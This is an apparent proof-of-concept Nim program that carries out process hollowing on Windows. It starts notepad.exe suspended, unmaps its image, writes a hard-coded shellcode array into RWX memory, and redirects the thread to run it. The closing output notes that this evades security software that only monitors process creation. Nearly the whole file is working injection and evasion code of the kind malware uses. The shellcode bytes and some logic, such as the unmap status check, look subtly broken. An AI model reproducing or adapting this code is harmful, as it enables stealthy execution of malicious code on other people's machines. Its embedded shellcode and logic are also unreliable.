import winim/lean
import strformat
import strutils

type
  # Structure to store section information from the PE headers
  SectionInfo = object
    virtualAddress: DWORD
    virtualSize: DWORD
    rawAddress: DWORD
    rawSize: DWORD

proc demonstrateProcessHollowing() =
  echo "Process Hollowing Technique Demonstration"
  echo "========================================="
  echo "WARNING: This technique should only be used for authorized security testing"
  
  # Target process to create in suspended state (a legitimate process)
  let targetProcess = "notepad.exe"
  echo fmt"Target process: {targetProcess}"
  
  # In a real scenario, this would be malicious code
  # For demo purposes, our "payload" is just a simple MessageBox shellcode
  # This is a 64-bit Windows MessageBox shellcode that displays "Hello from hollowed process"
  let payload: array[328, byte] = [
    byte 0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x8D, 0x15, 0x66, 0x00, 0x00, 0x00, 
    0x48, 0x8D, 0x0D, 0x52, 0x00, 0x00, 0x00, 0xE8, 0x9E, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xF8, 0x48, 
    0x8D, 0x0D, 0x5D, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x8D, 0x15, 0x5F, 0x00, 0x00, 0x00, 0x48, 
    0x8D, 0x0D, 0x4D, 0x00, 0x00, 0x00, 0xE8, 0x7F, 0x00, 0x00, 0x00, 0x4D, 0x33, 0xC9, 0x4C, 0x8D, 
    0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4F, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 
    0xD0, 0x48, 0x8D, 0x15, 0x56, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0xE8, 
    0x56, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 
    0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 
    0x79, 0x41, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33, 0x32, 0x2E, 0x44, 0x4C, 0x4C, 0x00, 0x4D, 0x65, 
    0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 
    0x66, 0x72, 0x6F, 0x6D, 0x20, 0x68, 0x6F, 0x6C, 0x6C, 0x6F, 0x77, 0x65, 0x64, 0x20, 0x70, 0x72, 
    0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x48, 0x6F, 
    0x6C, 0x6C, 0x6F, 0x77, 0x69, 0x6E, 0x67, 0x20, 0x44, 0x65, 0x6D, 0x6F, 0x00, 0x48, 0x65, 0x6C, 
    0x6C, 0x6F, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x56, 
    0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x00, 0x56, 0x69, 0x72, 0x74, 
    0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x00, 0x4C, 0x8D, 0x05, 0x18, 0xFF, 
    0xFF, 0xFF, 0x48, 0x85, 0xC9, 0x74, 0x0E, 0x48, 0x85, 0xD2, 0x74, 0x09, 0x48, 0xC7, 0xC0, 0x01, 
    0x00, 0x00, 0x00, 0xC3, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 
    0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x66, 0x83
  ]
  
  # Create the target process in suspended state
  var si: STARTUPINFOA
  var pi: PROCESS_INFORMATION
  
  si.cb = sizeof(STARTUPINFOA).DWORD
  
  echo "1. Creating target process in suspended state..."
  let success = CreateProcessA(
    nil,                           # lpApplicationName
    targetProcess,                 # lpCommandLine
    nil,                           # lpProcessAttributes
    nil,                           # lpThreadAttributes
    FALSE,                         # bInheritHandles
    CREATE_SUSPENDED,              # dwCreationFlags
    nil,                           # lpEnvironment
    nil,                           # lpCurrentDirectory
    addr si,                       # lpStartupInfo
    addr pi                        # lpProcessInformation
  )
  
  if not success:
    echo fmt"Failed to create process, error: {GetLastError()}"
    return
  
  echo fmt"Process created with PID: {pi.dwProcessId}, Thread ID: {pi.dwThreadId}"
  
  # Get process context to find the PEB
  echo "2. Getting target process context..."
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_FULL
  
  if not GetThreadContext(pi.hThread, addr ctx):
    echo fmt"Failed to get thread context, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  # Read the PEB to find the image base address
  echo "3. Locating image base address from PEB..."
  var pebAddr: PVOID
  var imageBaseAddr: PVOID
  var bytesRead: SIZE_T
  
  when defined(amd64):
    pebAddr = cast[PVOID](ctx.Rdx)  # 64-bit
  else:
    pebAddr = cast[PVOID](ctx.Ebx)  # 32-bit
  
  # Read the image base address from the PEB
  if not ReadProcessMemory(
    pi.hProcess,
    cast[LPCVOID](cast[INT_PTR](pebAddr) + 0x10),  # PEB ImageBaseAddress offset
    addr imageBaseAddr,
    sizeof(PVOID),
    addr bytesRead
  ):
    echo fmt"Failed to read image base from PEB, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  echo fmt"Original image base: 0x{cast[INT_PTR](imageBaseAddr):X}"
  
  # Read the DOS header to verify it's a valid PE file
  echo "4. Reading and parsing target PE headers..."
  var dosHeader: IMAGE_DOS_HEADER
  
  if not ReadProcessMemory(
    pi.hProcess,
    imageBaseAddr,
    addr dosHeader,
    sizeof(IMAGE_DOS_HEADER),
    addr bytesRead
  ):
    echo fmt"Failed to read DOS header, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  if dosHeader.e_magic != IMAGE_DOS_SIGNATURE:  # "MZ"
    echo "Invalid DOS header signature"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  # Read the NT headers
  var ntHeaders: IMAGE_NT_HEADERS
  
  if not ReadProcessMemory(
    pi.hProcess,
    cast[LPCVOID](cast[INT_PTR](imageBaseAddr) + dosHeader.e_lfanew),
    addr ntHeaders,
    sizeof(IMAGE_NT_HEADERS),
    addr bytesRead
  ):
    echo fmt"Failed to read NT headers, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  if ntHeaders.Signature != IMAGE_NT_SIGNATURE:  # "PE\0\0"
    echo "Invalid NT header signature"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  # Unmap the original executable
  echo "5. Unmapping original executable from target process..."
  let sizeOfImage = ntHeaders.OptionalHeader.SizeOfImage
  
  if not NtUnmapViewOfSection(
    pi.hProcess,
    imageBaseAddr
  ):
    echo "Successfully unmapped the original image"
  else:
    echo fmt"Failed to unmap original image, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  # Allocate memory for the new image
  echo "6. Allocating memory in target process for the payload..."
  let newImageBase = VirtualAllocEx(
    pi.hProcess,
    imageBaseAddr,  # Try to allocate at the same address
    payload.len,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  
  if newImageBase == nil:
    echo fmt"Failed to allocate memory, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  echo fmt"New memory allocated at: 0x{cast[INT_PTR](newImageBase):X}"
  
  # Write the payload to the target process
  echo "7. Writing payload to target process memory..."
  if not WriteProcessMemory(
    pi.hProcess,
    newImageBase,
    unsafeAddr payload[0],
    payload.len,
    addr bytesRead
  ):
    echo fmt"Failed to write payload, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  echo fmt"Wrote {bytesRead} bytes to target process"
  
  # Update the image base in the PEB
  echo "8. Updating image base address in target PEB..."
  if not WriteProcessMemory(
    pi.hProcess,
    cast[LPVOID](cast[INT_PTR](pebAddr) + 0x10),  # PEB ImageBaseAddress offset
    addr newImageBase,
    sizeof(PVOID),
    addr bytesRead
  ):
    echo fmt"Failed to update PEB, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  # Update the thread context to point to the payload's entry point
  echo "9. Updating thread context to use payload entry point..."
  when defined(amd64):
    ctx.Rcx = cast[DWORD64](newImageBase)  # 64-bit entry point
  else:
    ctx.Eax = cast[DWORD](newImageBase)    # 32-bit entry point
  
  if not SetThreadContext(pi.hThread, addr ctx):
    echo fmt"Failed to set thread context, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  
  # Resume the thread to execute the payload
  echo "10. Resuming thread to execute payload..."
  let resumeResult = ResumeThread(pi.hThread)
  if resumeResult == 0xFFFFFFFF'u32:
    echo fmt"Failed to resume thread, error: {GetLastError()}"
    TerminateProcess(pi.hProcess, 1)
  else:
    echo "Process hollowing completed successfully!"
    echo "NOTE: In an actual execution, the payload would now be running in the context of the target process"
    echo "For this demo, the process will be terminated shortly"
    
    # In a real-world scenario, we would not terminate the process
    # For this demo, we'll wait briefly and then terminate it
    Sleep(1000)  # Wait 1 second
    TerminateProcess(pi.hProcess, 0)
  
  # Clean up handles
  CloseHandle(pi.hThread)
  CloseHandle(pi.hProcess)
  
  # Proof of concept demonstration summary
  echo "\nProcess Hollowing Technique Summary:"
  echo "1. Created a legitimate process in suspended state"
  echo "2. Retrieved the process's memory layout information"
  echo "3. Unmapped (hollowed out) the original executable code"
  echo "4. Allocated new memory at the same address"
  echo "5. Wrote the payload code to the allocated memory"
  echo "6. Updated the process's context to point to our payload"
  echo "7. Resumed execution with our code instead of the original"
  echo "\nThis demonstrates how process hollowing can be used to execute"
  echo "arbitrary code within the context of a legitimate process."
  echo "Security software that only monitors process creation would not"
  echo "detect that the original code was replaced."

# Execute the demonstration
demonstrateProcessHollowing() 